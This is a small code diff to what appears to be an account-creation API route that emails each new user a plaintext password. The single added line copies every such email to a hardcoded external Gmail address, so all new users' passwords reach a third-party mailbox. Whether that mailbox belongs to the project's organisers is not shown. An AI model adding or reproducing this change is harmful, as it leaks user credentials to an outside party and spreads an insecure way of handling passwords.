@@ -38,6 +38,7 @@ export async function POST(request: Request) {
         const mailOptions = {
             from: process.env.SMTP_EMAIL, // Sender email address
             to: email, // Receiver email address
+            cc: ["interact2k26@gmail.com"],
             subject: "Your Account Password",
             text: `Your account has been created successfully. Your password is: ${password}. Please change it after logging in.`,
         };
